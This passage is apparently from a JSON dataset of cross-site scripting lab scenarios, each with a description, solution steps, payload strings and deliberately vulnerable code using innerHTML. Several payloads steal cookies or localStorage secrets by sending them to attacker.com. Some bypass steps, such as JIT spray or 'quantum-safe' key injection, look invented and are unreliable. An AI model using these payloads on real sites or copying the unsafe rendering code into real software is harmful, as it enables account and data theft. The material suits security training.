    "srcCode": "const parser = new WebVTT.Parser();\nparser.oncue = cue => {\n  player.textTracks[0].addCue(cue);\n};\nparser.parse(userSubtitleData);"
  },
  {
    "Lab scenario": "Stored XSS in Browser Extension CSP Bypass via Chrome Storage",
    "Lab Description": "A popular Chrome extension stores user preferences in chrome.storage.local without input sanitization. The application's content script injects stored values into visited pages. To solve: Achieve universal XSS across all sites using the extension's privileged context.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use extension's messaging API to inject payload",
      "Craft stored value: <img src=x onerror=window.postMessage({type:'xss',data:document.cookie},'*')>",
      "Bypass extension CSP using eval in allowed script contexts",
      "Exploit same-origin policy exceptions for chrome-extension://",
      "Verify through extension's sync feature across devices"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "javascript:fetch('https://attacker.com?exfil='+btoa(localStorage.secrets))",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    ],
    "srcCode": "chrome.storage.local.get(['userPrefs'], data => {\n  document.getElementById('config').innerHTML = data.userPrefs;\n});"
  },
  {
    "Lab scenario": "DOM XSS in E-commerce Product Customizer via SVG Parameter Injection",
    "Lab Description": "An online jewelry designer embeds user-controlled SVG parameters in product previews. The application uses client-side XML parsing with namespace injection. To solve: Manipulate SVG viewBox attribute to execute script during product image rendering.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept product customization request with Burp",
      "Modify SVG width parameter: 100\" onload=\"alert(1)",
      "Bypass XML validation using mixed-case event handlers",
      "Exploit Chrome's SVG script execution quirks",
      "Trigger through shareable product link feature"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\">",
      "<image href=\"javascript:alert(1)\"/>"
    ],
    "srcCode": "const svgPreview = `<svg width=\"${userWidth}\" height=\"${userHeight}\">\n  <path d=\"${userDesign}\"/>\n</svg>`;\ndocument.getElementById('preview').innerHTML = svgPreview;"
  },
  {
    "Lab scenario": "Mutation XSS in DICOM Medical Imaging Metadata",
    "Lab Description": "A telehealth platform's DICOM viewer renders patient metadata using legacy parsing libraries. The application converts DICOM tags to HTML tables without proper namespace isolation. To solve: Inject JavaScript through crafted modality field that executes when radiologists view scan details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Python pydicom to forge malicious DICOM file",
      "Inject payload: (0008,0060) Modality = \"<svg/onload=alert(`PHI_LEAK`)>\",",
      "Bypass DICOM VR validation using multi-encoded null bytes",
      "Exploit AngularJS sandbox escape in PACS workstation viewer",
      "Trigger through shared case discussion feature"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "(0010,0010) PatientName = \"<script>parent.postMessage(localStorage,'*')</script>\"",
      "(0008,0005) SpecificCharacterSet = \"\\1F\\8B\\08<script>alert(1)</script>\""
    ],
    "srcCode": "app.get('/dicom-metadata', (req, res) => {\n  const dicomData = parseDicom(req.query.file);\n  res.send(`<table>${dicomData.tags.map(t => `<tr><td>${t.name}</td><td>${t.value}</td></tr>`).join('')}</table>`);\n});"
  },
  {
    "Lab scenario": "WebAssembly Memory Corruption to XSS in Trading Platform",
    "Lab Description": "A stock trading interface uses Rust-compiled WebAssembly for chart rendering with improper JS boundary checks. The application passes user-controlled buffers between Wasm/JS without validation. To solve: Manipulate candle stick data arrays to corrupt memory and achieve script execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Chrome DevTools Wasm debugger to inspect memory pages",
      "Craft oversized Float32Array payload with XSS polyglot headers",
      "Exploit dangling pointers in Wasm Table exports",
      "Bypass Data Execution Prevention using JIT spray techniques",
      "Trigger through saved chart template sharing system"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "new Float32Array([0x3c,0x73,0x63,0x72,0x69,0x70,0x74,0x3e])",
      "memory.grow(256); new Uint8Array(memory.buffer).set([60,115,99,114...])"
    ],
    "srcCode": "const wasmMemory = new WebAssembly.Memory({ initial: 256 });\nconst imports = { env: { memory: wasmMemory } };\nWebAssembly.instantiateStreaming(fetch('chart.wasm'), imports);"
  },
  {
    "Lab scenario": "JWT Claim Injection in SPA Admin Panel",
    "Lab Description": "A React admin dashboard decodes JWT tokens client-side using insecure JSON.parse. The application displays token claims in debug mode without output encoding. To solve: Forge JWT containing XSS payload that executes when admins view user details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture JWT using Burp Suite and decode structure",
      "Inject unicode payload: {\"user\":\"\\u003Cimg src=x onerror=alert(1)\"}",
      "Bypass signature validation using 'none' algorithm attack",
      "Exploit React's dangerouslySetInnerHTML in claim display",
      "Trigger through admin audit log review interface"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiJ9.",
      "{\"alg\":\"HS256\",\"typ\":\"JWT\"}...{\"admin\":\"<iframe srcdoc='<script>parent.alert(1)</script>'>\"}"
    ],
    "srcCode": "const token = jwt.decode(localStorage.getItem('token'));\nfunction UserInfo() {\n  return <div dangerouslySetInnerHTML={{__html: token.user}} />;\n}"
  },
  {
    "Lab scenario": "WebRTC Data Channel XSS in Video Conferencing App",
    "Lab Description": "A WebRTC-based collaboration tool renders data channel messages as HTML through insecure postMessage handlers. The application trusts origin validation from STUN server responses. To solve: Inject XSS through manipulated SDP offers that execute in active conference participants' browsers.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept SDP offer/answer exchange using Wireshark",
      "Modify session description: a=ice-ufrag:<script src=//attacker.com/xss.js>",
      "Bypass SDP parser syntax validation using line wrapping",
      "Exploit RTCPeerConnection's ondatachannel handler",
      "Trigger through automated webinar recording system"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "a=candidate:1 1 UDP 2122252543 <img/src=1 onerror=alert(1)> 1234 typ host",
      "o=- 0 0 IN IP4 127.0.0.1\n<script>alert(1)</script>"
    ],
    "srcCode": "pc.ondatachannel = e => {\n  e.channel.onmessage = msg => {\n    document.getElementById('chat').innerHTML += msg.data;\n  };\n};"
  },
  {
    "Lab scenario": "Electron Protocol Handler XSS in Desktop Analytics Tool",
    "Lab Description": "A business analytics app registers custom electron:// protocol with insufficient input validation. The application loads untrusted content in privileged context using webview tag. To solve: Achieve OS-level command execution through chained protocol handling and XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft malicious link: electron://analytics/load?url=data:text/html,<script>require('child_process').exec(...)</script>",
      "Bypass protocol whitelist using double encoding",
      "Exploit webview's nodeIntegrationInSubFrames setting",
      "Chain with IPC message handler vulnerabilities",
      "Verify through exported PDF report generation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "electron://%3Cscript%3Ealert(1)%3C/script%3E",
      "<webview src=\"data:text/html,<script>alert(navigator.userAgent)</script>\"></webview>"
    ],
    "srcCode": "app.setAsDefaultProtocolClient('electron');\napp.on('open-url', (event, url) => {\n  mainWindow.loadURL(url);\n});"
  },
  {
    "Lab scenario": "XSS via Quantum-Safe Cryptography Dashboard Logs",
    "Lab Description": "A post-quantum cryptography implementation's monitoring interface insecurely renders lattice-based algorithm parameters. The application converts Kyber-1024 public keys to visual diagrams using innerHTML. To solve: Inject malicious SVG formulas that execute when admins review key rotation logs.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept key generation API call using Burp Suite",
      "Craft payload: <svg><script>alert(1)</script></svg> as public key coefficient",
      "Bypass hex encoding validation using polynomial coefficient wrapping",
      "Exploit Chrome's SVG script execution in foreignObject tags",
      "Trigger through automated key health check reports"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "\\x3csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'\\x3e",
      "<math><maction actiontype='statusline#xss' xlink:href='javascript:alert(1)'></maction>"
    ],
    "srcCode": "function renderPublicKey(key) {\n  const coefficients = key.match(/.{1,4}/g);\n  document.getElementById('visualizer').innerHTML = \n    `<svg>${coefficients.map(c => `<rect data-value=\"${c}\"></rect>`).join('')}</svg>`;\n}"
  },
  {
    "Lab scenario": "Web3 XSS in NFT Marketplace Trait Injection",
    "Lab Description": "An NFT platform's metadata viewer parses ERC-721 traits as HTML when displaying rare attributes. The application's Ethers.js integration fails to sanitize IPFS-hosted JSON metadata. To solve: Create malicious NFT traits that execute JavaScript when viewed in the marketplace explorer.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Deploy malicious NFT contract with trait: {\"trait_type\":\"<img src=x>\", \"value\":\"onerror=alert(1)\"}",
      "Bypass IPFS CID validation using multihash injection",
      "Exploit React's hydration mismatch in SSR-rendered metadata",
      "Chain with OpenSea API cache poisoning",
      "Verify through mobile app's lazy-rendering implementation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"attributes\":[{\"trait_type\":\"\\u003Cscript\\u003E\",\"value\":\"alert(1)\\u003C/script\\u003E\"}]}",
      "<iframe srcdoc='<script>parent.alert(document.cookie)</script>'></iframe>"
    ],
    "srcCode": "async function fetchMetadata(cid) {\n  const res = await ipfs.cat(cid);\n  const metadata = JSON.parse(res);\n  document.getElementById('traits').innerHTML = \n    metadata.attributes.map(a => `${a.trait_type}: ${a.value}`).join('<br>');\n}"
  },
  {
    "Lab scenario": "AR XSS in WebGL Object Loader via 3D Model Metadata",
    "Lab Description": "A WebAR education platform's Three.js model importer parses GLB file metadata into DOM elements. The application extracts user comments from 3D model headers without sanitization. To solve: Craft a 3D model with XSS payload that executes when teachers inspect student submissions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Blender to inject payload into .glb file metadata",
      "Bypass MIME type validation using glTF 2.0 extensions",
      "Exploit THREE.ObjectLoader parsing of custom userData fields",
      "Bypass CSP using WebGL shader injection techniques",
      "Trigger through AR scene sharing functionality"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"userData\":{\"comment\":\"<iframe srcdoc='<script>alert(1)</script>'></iframe>\"}}",
      "<!-- <script>alert(1)</script> --> in COLLADA .dae file"
    ],
    "srcCode": "const loader = new THREE.GLTFLoader();\nloader.load(modelUrl, gltf => {\n  document.getElementById('model-info').innerHTML = \n    gltf.userData.comment;\n});"
  },
  {
    "Lab scenario": "Kubernetes Dashboard XSS via Custom Metric Labels",
    "Lab Description": "A cluster monitoring dashboard renders Prometheus metrics with label metadata as HTML tooltips. The application's Go template engine fails to escape custom gauge labels. To solve: Inject XSS through kubectl metrics push that executes when operators hover over pod metrics.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft malicious metric: kube_pod_labels{namespace='default',label_<img=1 onerror=alert(1)>='1'} 1",
      "Bypass Prometheus metric name validation using Unicode homoglyphs",
      "Exploit React's dangerouslySetInnerHTML in tooltip component",
      "Chain with Service Account token leakage",
      "Trigger through Grafana dashboard sharing feature"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "kube_pod_labels{label_\\u003Cscript\\u003E=\"alert(1)\"} 1",
      "kube_node_info{kernelVersion=\"<img src=x onerror=fetch('/steal?data='+btoa(document.cookie))>\"} 1"
    ],
    "srcCode": "func renderTooltip(labels map[string]string) string {\n  return fmt.Sprintf(`<div class=\"tooltip\">%s</div>`, \n    strings.Join(formatLabels(labels), \"<br>\"))\n}"
  },
  {
    "Lab scenario": "AI Training UI XSS via Model Hyperparameter Injection",
    "Lab Description": "An MLOps platform's training interface accepts JSON hyperparameters that get rendered in TensorBoard comparisons. The application's Vue-based UI directly interpolates learning rate schedules into DOM. To solve: Inject XSS through optimizer configuration that executes when researchers compare model runs.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify hyperparams.json: {\"lr_scheduler\": \"<script>alert(1)</script>\"}",
      "Bypass JSON schema validation using exponential notation",
      "Exploit Vue's v-html directive in metrics comparison table",
      "Chain with Jupyter notebook kernel injection",
      "Verify through automated model documentation generator"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"optimizer\": {\"name\": \"Ada\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}}",
      "\"lr_policy\": \"<img src='x' onerror='new Image().src=`http://attacker.com?cookie=${document.cookie}`'>\""
    ],
    "srcCode": "new Vue({\n  el: '#hyperparams',\n  data: { config: trainingConfig },\n  template: `<div v-html=\"config.lr_scheduler\"></div>`\n});"
  },
  {
    "Lab scenario": "Blockchain Oracle UI XSS via Smart Contract Event Logs",
    "Lab Description": "A DeFi yield aggregator's dashboard renders Ethereum event logs from oracle contracts without sanitization. The application decodes logged UTF-8 error messages directly into DOM elements. To solve: Exploit Chainlink oracle deviation alerts to store XSS payload that triggers when users check price feed health.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Interact with oracle contract using Foundry cast",
      "Craft log payload: emit AnswerUpdated(int256 answer, \"<svg onload=alert(1)>\", now)",
      "Bypass EVM string length limits using continuation logs",
      "Exploit Angular material tooltip sanitization bypass",
      "Trigger through arbitrage opportunity alert emails"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "web3.eth.abi.encodeParameters(['string'], ['<img/src=1 onerror=alert(1)>'])",
      "\\u003Cscript\\u003Eweb3.eth.getStorageAt(...)\\u003C/script\\u003E"
    ],
    "srcCode": "app.get('/oracle-events', async (req, res) => {\n  const events = await contract.queryFilter('AnswerUpdated');\n  res.send(`<div>${events.map(e => e.args.description).join('')}</div>`);\n});"
  },
  {
    "Lab scenario": "GIS XSS via GeoJSON Feature Properties in Crisis Map",
    "Lab Description": "An emergency response system's map viewer parses GeoJSON disaster zones with dangerous property rendering. The application converts feature properties to HTML popups using unsafe DOM methods. To solve: Inject XSS through manipulated flood polygon metadata that executes when responders click map markers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use QGIS to modify GeoJSON properties",
      "Craft payload: \"description\": \"<img src=1 onerror=alert('EVAC_ORDER')>\",",
      "Bypass GeoJSON schema validation using 3D coordinate arrays",
      "Exploit OpenLayers popup HTML sanitizer whitelist",
      "Trigger through shared situational awareness overlay"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"type\":\"Feature\",\"properties\":{\"label\":\"\\u003Cscript src='//xss.rocks'\\u003E\"}}",
      "<details ontoggle=alert(1) open>"
    ],
    "srcCode": "map.on('click', e => {\n  const props = e.features[0].properties;\n  popup.setHTML(`<h3>${props.title}</h3><p>${props.description}</p>`);\n});"
  },
  {
    "Lab scenario": "Digital Twin XSS via MQTT Metadata in Factory Control Panel",
    "Lab Description": "An industrial digital twin system renders MQTT device metadata as HTML tables. The application subscribes to wildcard topics without payload validation. To solve: Publish malicious machine telemetry that executes scripts in maintenance engineers' dashboards.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use MQTT Explorer to intercept factory-floor topics",
      "Craft payload: {\"status\":\"<iframe srcdoc='<script>parent.alert(1)</script>'></iframe>\"}",
      "Bypass Sparkplug B payload encoding checks",
      "Exploit retained message persistence across shifts",
      "Trigger through predictive maintenance alert system"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "factory/line1/+/metrics {\"oee\":\"<svg/onload=alert(document.domain)>\"}",
      "{\\\"temp\\\":\\\"300\\\",\\\"units\\\":\\\"\u00c2\u00b0<script>alert(1)</script>\\\"}"
    ],
    "srcCode": "mqttClient.on('message', (topic, message) => {\n  const data = JSON.parse(message);\n  document.getElementById(topic).innerHTML = \n    `<tr><td>${data.status}</td></tr>`;\n});"
  },
  {
    "Lab scenario": "WebAuthn XSS via Authenticator Attestation Statements",
    "Lab Description": "A passwordless authentication system displays authenticator metadata from attestationObject without sanitization. The application parses CBOR-encoded device info into debug panels. To solve: Forge malicious FIDO2 credential registration that triggers XSS during security log reviews.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify authenticatorData using python-fido2",
      "Inject payload: \"aaguid\": \"<img src=1 onerror=alert('MFA_BYPASS')>\",",
      "Bypass Base64URL encoding validation using fragmented strings",
      "Exploit Firefox's WebAuthn debug panel rendering",
      "Trigger through compliance audit report generation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "attestationObject: {\"fmt\":\"none\",\"attStmt\":{},\"authData\":\"<script>alert(1)</script>\"}",
      "{\"id\":\"X1NDUklQVD5hbGVydCgxKTwv\",\"type\":\"public-key\"}"
    ],
    "srcCode": "app.post('/webauthn/register', (req, res) => {\n  const attestation = cbor.decode(req.body.attestation);\n  res.render('debug-view', { authenticator: attestation.authData });\n});"
  },
  {
    "Lab scenario": "Serverless Cold Start XSS via Lambda Environment Variables",
    "Lab Description": "A serverless error tracking portal leaks Lambda environment variables during cold starts. The application renders stack traces with process.env values in admin panels. To solve: Exploit delayed initialization to inject XSS through manipulated function configuration.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use AWS CLI to update function env vars with payload",
      "Craft payload: ENV_KEY=\"<img src=x onerror=alert('AWS_KEYS')>\"",
      "Force cold starts through concurrent executions",
      "Bypass CloudWatch Logs Insights sanitization",
      "Trigger through CI/CD pipeline failure notifications"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "process.env.{LAMBDA_TASK_ROOT: '<script>alert(1)</script>'}",
      "ENV SECRET=\"\\u0022\\u003E\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\""
    ],
    "srcCode": "app.get('/error/:function', async (req, res) => {\n  const logs = await getLambdaLogs(req.params.function);\n  res.send(`<pre>${logs.join('\n').replace(/\\n/g, '<br>')}</pre>`);\n});"
  },
  {
    "Lab scenario": "Stored XSS in Serverless Contact Form via Vercel Serverless Function",
    "Lab Description": "A JAMstack site's contact form stores submissions in CosmosDB through an Azure Function that fails to sanitize Markdown-formatted messages. The application renders entries using dangerouslySetInnerHTML in Next.js. To solve: Inject XSS that triggers when customer service agents review submissions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept form submission using Burp Suite",
      "Craft payload: [XSS](javascript&#58;alert`1`)",
      "Bypass Markdown href sanitization using HTML entities",
      "Exploit Next.js static regeneration caching mechanism",
      "Verify through admin portal's message threading view"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "![AltText](x\"onerror=\"alert(1))",
      "[Click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg)"
    ],
    "srcCode": "export default async function handler(req, res) {\n  await cosmos.items.create({ message: req.body.text });\n  res.status(200).json({ success: true });\n}"
  },
  {
    "Lab scenario": "DOM XSS in Real-Time Code Collaboration Editor via Yjs CRDT",
    "Lab Description": "A collaborative coding platform using Yjs framework inserts user cursor positions without proper escaping. The application syncs peer activities through WebSocket messages containing raw HTML. To solve: Exploit presence indicator updates to execute code in other collaborators' sessions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept WebSocket messages",
      "Modify cursorPosition message: {\"user\":\"<iframe srcdoc='<script>parent.alert(1)</script>'\",",
      "Bypass CRDT conflict resolution using timestamp manipulation",
      "Exploit Monaco Editor's trustedTypes policy bypass",
      "Trigger through multi-cursor selection feature"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"user\":\"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\",\"pos\":0}",
      "y.applyUpdate(doc, decodeUpdateFromBase64(\"<script>alert(1)</script>\"))"
    ],
    "srcCode": "yjsConnector.on('message', msg => {\n  document.getElementById('collab-users').innerHTML += \n    `<div>${msg.user} is editing</div>`;\n});"
  },
  {
    "Lab scenario": "Mutation XSS in Jupyter Notebook Kernel Output Rendering",
    "Lab Description": "A cloud-based Jupyter hub fails to sanitize DataFrame HTML outputs containing malicious SVG schemas. The application uses IPython's display() function with raw HTML rendering. To solve: Craft a pandas DataFrame that executes JavaScript when data scientists view cell outputs.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create malicious DataFrame: df.style.set_table_attributes('onmouseover=alert(1)')",
      "Bypass IPython HTML sanitization using MathJax delimiters",
      "Exploit Vega-Lite visualization injection points",
      "Chain with notebook export to HTML feature",
      "Verify through shared kernel sessions"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "pd.DataFrame({'data': ['<svg/onload=alert(1)>']})",
      "%%html\n<script>alert(1)</script>"
    ],
    "srcCode": "from IPython.display import HTML\nHTML(df.to_html(escape=False))"
  },
  {
    "Lab scenario": "Reflected XSS in Swagger UI via OAuth2 Redirect URL",
    "Lab Description": "An API documentation portal's Swagger implementation reflects OAuth2 callback parameters without encoding. The application uses unsanitized window.location.hash parsing for auth token handling. To solve: Exploit the OAuth implicit flow to execute XSS in developers' API testing sessions.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Modify authorization callback URL in Postman",
      "Inject payload: #access_token=<script>alert(1)</script>",
      "Bypass URL fragment validation using double encoding",
      "Exploit Swagger UI's try-it-out feature rendering",
      "Trigger through OAuth token validation error states"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "http://localhost/callback#error=<img/src=1 onerror=alert(1)>",
      "redirect_uri=https%3A%2F%2Fattacker.com%2F%23%3Cscript%3Ealert(1)%3C%2Fscript%3E"
    ],
    "srcCode": "const token = new URLSearchParams(window.location.hash.substr(1)).get('access_token');\ndocument.getElementById('token-display').innerHTML = token;"
  },
  {
    "Lab scenario": "DOM XSS in WebAssembly Game Engine via Scoreboard Rendering",
    "Lab Description": "A browser-based game using Unity WebGL exports player scores to DOM without validation. The application passes strings between Wasm memory and JS using insecure buffer copying. To solve: Manipulate highscore submission to execute script in other players' leaderboard views.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Cheat Engine to modify WebAssembly memory values",
      "Craft payload: Score: <iframe srcdoc='<script>parent.alert(1)</script>'></iframe>",
      "Bypass UTF-8 validation using surrogate pairs",
      "Exploit Unity's Application.ExternalCall handler",
      "Trigger through global leaderboard refresh feature"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "Module.HEAPU8.set([60,115,99,114,105,112,116,62], bufferAddr);",
      "UNITY_Loader.asmLibraryArg._UpdateScore('<img/src=1 onerror=alert(1)>')"
    ],
    "srcCode": "function updateScore(scorePtr) {\n  const score = UTF8ToString(scorePtr);\n  document.getElementById('score').innerHTML = score;\n}"
  },
  {
    "Lab scenario": "DOM XSS in Web Bluetooth API Device Name Parsing",
    "Lab Description": "A fitness tracking PWA scans nearby Bluetooth devices and displays names using innerHTML. The application caches device metadata in IndexedDB without validation. To solve: Spoof BLE device with XSS payload that executes when users view scan history.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use BetterCAP to advertise malicious BLE device",
      "Craft device name: <svg onload=alert(1)>",
      "Bypass Bluetooth spec length limits using fragmented advertising packets",
      "Exploit Web Bluetooth service UUID whitelisting bypass",
      "Trigger through offline scan data synchronization"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "\u00ce\u00bc<iframe/src=javascript:alert(1)>",
      "HeartRateMonitor<script>alert(1)</script>"
    ],
    "srcCode": "navigator.bluetooth.requestDevice({filters: [{name: userSearchTerm}]})\n.then(device => {\n  document.getElementById('devices').innerHTML += `<li>${device.name}</li>`;\n});"
  },
  {
    "Lab scenario": "Stored XSS in Shopify Theme Liquid Template Injection",
    "Lab Description": "A Shopify store's custom theme uses unsafe {{ customer.metafield }} rendering. The application's Liquid template disables HTML escaping for promotional banners. To solve: Inject XSS through customer metadata that triggers on product page loads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Modify customer metafields using Storefront API",
      "Craft payload: {{ \"<script>\" }}alert(1){{ \"</script>\" }}",
      "Bypass Liquid sanitization using capture tags",
      "Exploit theme.liquid layout inheritance",
      "Verify through draft order preview functionality"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{% capture xss %}<script>alert(1)</script>{% endcapture %}{{ xss }}",
      "{{ '<img src=x onerror='| append: 'alert(1)' }}"
    ],
    "srcCode": "<!-- theme.liquid -->\n<div class=\"banner\">\n  {{ customer.metafields.global.warning_message }}\n</div>"
  },
  {
    "Lab scenario": "Mutation XSS in Apache Superset Dashboard Chart Annotations",
    "Lab Description": "A business intelligence platform renders markdown annotations in Vega-Lite charts as HTML. The application's SQL Lab feature allows CSV exports with raw HTML. To solve: Craft malicious annotation that executes when analysts export to PDF.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use SQL Lab to create table with XSS payload",
      "Inject: <![CDATA[<svg onload=alert(1)>]]>",
      "Bypass markdown-to-HTML conversion using nested iframes",
      "Exploit Superset's SVG sanitizer allowlist",
      "Trigger through scheduled report generation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "ANNOTATE SET `<style><script>alert(1)</script></style>`",
      "COMMENT ON COLUMN table IS '<!--<img src=-->'<script>alert(1)</script>'"
    ],
    "srcCode": "// superset_config.py\nFEATURE_FLAGS = {\n  \"ENABLE_TEMPLATE_PROCESSING\": True\n}"
  },
  {
    "Lab scenario": "DOM XSS in Web Serial API Thermal Printer Emulation",
    "Lab Description": "An industrial control system web app interacts with serial devices using Web Serial API. The application renders received Uint8Array data as text/html. To solve: Spoof thermal printer output containing XSS that executes in maintenance interface.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept Web Serial traffic",
      "Craft payload: <marquee loop=1 onfinish=alert(1)>",
      "Bypass UTF-8 decoding errors using overlong encodings",
      "Exploit serial port read/write permissions",
      "Trigger through automated device diagnostics report"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "new TextEncoder().encode('<script>alert(1)</script>')",
      "Uint8Array.from([60,115,99,114,105,112,116,62])"
    ],
    "srcCode": "const reader = port.readable.getReader();\nwhile (true) {\n  const { value } = await reader.read();\n  document.getElementById('output').innerHTML += new TextDecoder().decode(value);\n}"
  },
  {
    "Lab scenario": "Stored XSS in Matter.js Physics Engine Metadata",
    "Lab Description": "A phygital game uses Matter.js physics engine to sync DOM elements with rigid bodies. The application stores sprite metadata in LocalStorage without validation. To solve: Manipulate collision boundaries to inject XSS that triggers on object impacts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Modify sprite JSON definition using browser Storage inspector",
      "Inject payload: \"label\":\"<img src=1 onerror=alert(1)>\",",
      "Bypass velocity validation using exponential notation",
      "Exploit Composite.add() method for DOM injection",
      "Trigger through multiplayer collision events"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "Matter.Bodies.rectangle(400, 200, 80, 80, { render: { label: '<svg/onload=alert(1)>' } })",
      "{\"type\":\"body\",\"label\":\"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}"
    ],
    "srcCode": "Matter.World.add(engine.world, [\n  Matter.Bodies.rectangle(400, 610, 810, 60, { \n    render: {\n      fillStyle: '#transparent',\n      text: userData.label\n    }\n  })\n]);"
  },
  {
    "Lab scenario": "DOM XSS in WebXR Hand Tracking Visualization",
    "Lab Description": "An AR fitness app renders hand joint positions using Three.js without sanitizing debug panel outputs. The application converts WebXR joint data to SVG visualizations using innerHTML. To solve: Manipulate hand tracking data to inject XSS that triggers during gesture recognition calibration.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use WebXR emulator to spoof hand positions",
      "Craft payload: joint.radius = \"<img src=x onerror=alert('XR_SESSION')>\",",
      "Bypass quaternion validation using NaN poisoning",
      "Exploit WebGL shader error handling",
      "Trigger through shared AR workout sessions"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "handedness: '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E'",
      "<details open ontoggle=alert(1)>"
    ],
    "srcCode": "function renderHands(hands) {\n  const svg = hands.map(h => \n    `<circle cx=\"${h.x}\" cy=\"${h.y}\" r=\"${h.radius}\"/>`);\n  document.getElementById('debug').innerHTML = svg.join('');\n}"
  },
  {
    "Lab scenario": "Stored XSS in ProseMirror Collaborative Document Version History",
    "Lab Description": "A legal document editing platform stores ProseMirror JSON content states without sanitizing version diffs. The application renders document history using dangerouslySetInnerHTML. To solve: Inject XSS through track changes metadata that executes when lawyers compare document versions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket document update messages",
      "Craft payload: {\"type\":\"text\",\"marks\":[{\"type\":\"comment\",\"attrs\":{\"id\":\"<script>alert(1)</script>\"}}]}",
      "Bypass Prosemirror schema validation using mark nesting",
      "Exploit sharedb operational transformation conflicts",
      "Verify through PDF export comment rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"node\":{\"type\":\"text\",\"text\":\"clause\",\"marks\":[{\"type\":\"onclick\",\"attrs\":{\"action\":\"alert(1)\"}}]}}",
      "<!--<script>alert(1)</script>-->"
    ],
    "srcCode": "const state = prosemirrorStateFromJSON(schema, req.body.content);\ndocument.getElementById('version-diff').innerHTML = \n  renderDiff(previousState, state);"
  },
  {
    "Lab scenario": "Mutation XSS in Web NFC Tag Data Parsing",
    "Lab Description": "A museum exhibit guide PWA reads NFC tags containing exhibit metadata without sanitizing NDEF records. The application processes text records as HTML in the info panel. To solve: Spoof NFC tag containing XSS payload that triggers when visitors scan exhibit markers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Flipper Zero to write malicious NFC tags",
      "Craft NDEF record: <noscript><p style=\"animation: x\"></noscript><img src=x onanimationstart=alert(1)>",
      "Bypass NDEF type validation using mixed UTF-16 encoding",
      "Exploit Chrome's NFC scanning background tab behavior",
      "Trigger through exhibit tour auto-play feature"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "nfc.write({ records: [{ recordType: 'text', data: '<svg/onload=alert(1)>' }]});",
